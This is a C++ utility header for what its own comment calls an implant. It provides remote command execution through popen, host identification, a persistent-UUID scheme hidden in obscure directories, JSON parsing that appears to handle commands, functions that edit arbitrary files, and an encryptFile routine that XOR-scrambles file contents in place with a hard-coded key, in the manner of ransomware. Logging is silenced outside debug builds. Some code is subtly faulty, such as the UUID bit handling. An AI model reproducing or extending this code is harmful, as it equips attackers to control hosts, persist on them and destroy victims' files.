#ifndef UTILS_HPP
#define UTILS_HPP

#include <string>
#include <array>
#include <vector>
#include <cstdio>
#include <memory>
#include <algorithm>
#include <unistd.h>
#include <fstream>
#include <filesystem>
#include <random>

#define POPEN popen
#define PCLOSE pclose

// log macro setup
#ifdef DEBUG
    #include <iostream>

    #define LOG_SUCCESS(...)    std::cout << "[+] " << std::format(__VA_ARGS__) << '\n';
    #define LOG_ERROR(...)      std::cout << "[-] " << std::format(__VA_ARGS__) << '\n';
    #define LOG_INFO(...)       std::cout << "[*] " << std::format(__VA_ARGS__) << '\n';
    #define LOG_ALERT(...)      std::cout << "[!] " << std::format(__VA_ARGS__) << '\n';
#else
    #define LOG_SUCCESS(...)
    #define LOG_ERROR(...)
    #define LOG_INFO(...)
    #define LOG_ALERT(...)
#endif

namespace Utils {
    // === SYSTEM UTILS ===
    std::string executeCommand(const std::string& command) {
        std::array<char, 128> buffer;
        std::string result;
        std::string fullCommand = command + " 2>&1";    // i've read it's generally good practice to redirect stderr in these kinds of implants

        FILE* pipe = POPEN(fullCommand.c_str(), "r");
        if (!pipe) {
            return "ERROR opening pipe";
        }

        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }

        PCLOSE(pipe);

        return result;
    }

    std::string getHostname() {
        char hostname[1024];

        if (gethostname(hostname, 1024) == 0) {
            return std::string(hostname);
        }

        return "unknown";
    }

    // TODO: code from https://antonz.org/uuidv7/#cpp by Anton Zhiyanov
    // TODO: modified to return string instead
    // SOLUTION: put the UUID as a file in some obscure user-writeable directory
    // SOLUTION: and check whether or not it's present before generating a new one
    std::string generateUuid() {
        std::string raw(16, '\0');

        // random bytes
        std::random_device rd;
        std::generate(raw.begin(), raw.end(), [&rd]() {
            return static_cast<char>(rd());
        });

        // current timestamp in ms
        auto now = std::chrono::system_clock::now();
        auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()
        ).count();

        // timestamp
        raw[0] += (millis >> 40) & 0xFF;
        raw[1] += (millis >> 32) & 0xFF;
        raw[2] += (millis >> 24) & 0xFF;
        raw[3] += (millis >> 16) & 0xFF;
        raw[4] += (millis >> 8) & 0xFF;
        raw[5] += millis & 0xFF;

        // version and variant
        raw[6] += (raw[6] & 0x0F) | 0x70;
        raw[8] += (raw[8] & 0x3F) | 0x80;

        std::stringstream ss;
        ss << std::hex << std::setfill('0');
        for (int i = 0; i < 16; i++) {
            if (i == 4 || i == 6 || i == 8 || i == 10) {
                ss << '-';
            }

            ss << std::setw(2) << static_cast<int>(static_cast<unsigned char>(raw[i]));
        }

        return ss.str();
    }

    // === JSON UTILS ===
    std::string jsonEscape(const std::string& json) {
        std::string output;

        for (char c : json) {
            switch (c) {
                case '"': output += "\\\""; break;
                case '\\': output += "\\\\"; break;
                case '\b': output += "\\b"; break;
                case '\f': output += "\\f"; break;
                case '\n': output += "\\n"; break;
                case '\r': output += "\\r"; break;
                case '\t': output += "\\t"; break;
                default: 
                    if (c < 32) {
                        char buf[7];
                        snprintf(buf, sizeof(buf), "\\u%04x", c);
                        output += buf;
                    } else {
                        output += c;
                    }
                    break;
            }
        }

        return output;
    }

    std::string getJsonValue(const std::string& json, const std::string& key) {
        std::string search = "\"" + key + "\":";
        size_t startPos = json.find(search);
        
        if (startPos == std::string::npos) return "";

        startPos += search.length();
        while (startPos < json.length() &&
                (json[startPos] == ' ' || json[startPos] == '\n' || json[startPos] == '\r')) {
            startPos++;
        }

        if (startPos >= json.length()) return "";

        if (json[startPos] == '"') {    // string
            size_t startQuote = startPos;
            size_t endQuote = json.find("\"", startQuote + 1);

            while (endQuote < json.length()) {
                if (json[endQuote] == '"' && json[endQuote - 1] != '\\') {
                    break;
                }

                endQuote++;
            }

            if (endQuote >= json.length()) {
                return "";
            }

            return json.substr(startQuote + 1, endQuote - startQuote - 1);
        } else {    // num or bool
            size_t endPos = json.find_first_of(",}", startPos);

            if (endPos == std::string::npos) {
                return "";
            }

            return json.substr(startPos, endPos - startPos);
        }
    }

    std::string getJsonArrayRaw(const std::string& json, const std::string& key) {
        std::string search = "\"" + key + "\":";
        size_t startPos = json.find(search);

        if (startPos == std::string::npos) {
            return "";
        }

        startPos += search.length();
        while (startPos < json.length() && json[startPos] == '[') {
            startPos++;
        }

        if (startPos >= json.length()) {
            return "";
        }

        int bracketCount = 1;
        size_t endPos = startPos;

        do {
            if (json[endPos] == '[') {
                bracketCount++;
            } else if (json[endPos] == ']') {
                bracketCount--;
            }

            endPos++;
        } while (bracketCount > 0 && endPos < json.length());

        return json.substr(startPos, endPos - startPos - 1);
    }

    std::vector<std::string> splitJsonObjects(std::string jsonArray) {
        std::vector<std::string> objects;
        if (jsonArray.length() < 2) {
            return objects;
        }
        
        jsonArray = jsonArray.substr(1, jsonArray.length() - 2);
        if (jsonArray.empty()) {
            return objects;
        }

        std::string delimiter = "},{";
        size_t pos = 0;
        while ((pos = jsonArray.find(delimiter)) != std::string::npos) {
            std::string token = jsonArray.substr(0, pos + 1);
            if (token[0] != '{') {
                token = "{" + token;
            }

            objects.push_back(token);
            jsonArray.erase(0, pos + 2);

            if (!jsonArray.empty() && jsonArray[0] != '{') {
                jsonArray = "{" + jsonArray;
            }
        }

        objects.push_back(jsonArray);

        return objects;
    }

    // === FILE UTILS ===
    bool appendToFile(const std::string& filepath, const std::string& lineToAppend) {
        std::fstream file(filepath, std::ios::in | std::ios::out);
        if (file.is_open()) {
            std::string line;

            while (std::getline(file, line)) {
                if (line.find(lineToAppend) != std::string::npos) {
                    return true;
                }
            }

            file.clear();
            
            file << "\n" << lineToAppend << "\n";
            file.close();

            return true;
        }

        return false;
    }

    bool removeFromFile(const std::string& filepath, const std::string& lineToRemove) {
        std::vector<std::string> lines;
        std::ifstream input(filepath);
        if (!input.is_open()) {
            return false;
        }
        
        std::string line;
        while (std::getline(input, line)) {
            if (line.find(lineToRemove) == std::string::npos) {
                lines.push_back(line);
            }
        }
        input.close();

        std::ofstream output(filepath, std::ios::trunc);
        if (!output.is_open()) {
            return false;
        }

        for (const auto& l : lines) {
            output << l << "\n";
        }
        output.close();
        
        return true;
    }

    bool encryptFile(const std::string& filepath) {
        const std::string key = "GHOST_ENCRYPTION_KEY_EXAMPLE";
        constexpr size_t CHUNK_SIZE = 4096;

        std::filesystem::path pathObj(filepath);
        if (!std::filesystem::exists(pathObj)) {
            LOG_ERROR("file doesnt exist {}", filepath)
            return false;
        }
        
        std::fstream file(pathObj, std::ios::binary | std::ios::in | std::ios::out);
        if (!file.is_open()) {
            LOG_ERROR("failed to open file {}", filepath)
            return false;
        }

        std::vector<char> buffer(CHUNK_SIZE);

        file.read(buffer.data(), CHUNK_SIZE);
        std::streamsize bytesRead = file.gcount();

        if (bytesRead == 0) {
            LOG_ALERT("FILE WAS EMPTY")
            return false;
        }

        std::span<char> dataSpan(buffer.data(), bytesRead);
        size_t keyLen = key.length();

        for (size_t i = 0; i < dataSpan.size(); i++) {
            dataSpan[i] ^= key[i % keyLen];
        }

        file.clear();
        file.seekp(0, std::ios::beg);
        file.write(dataSpan.data(), dataSpan.size());

        return file.good();
    }
}

#endif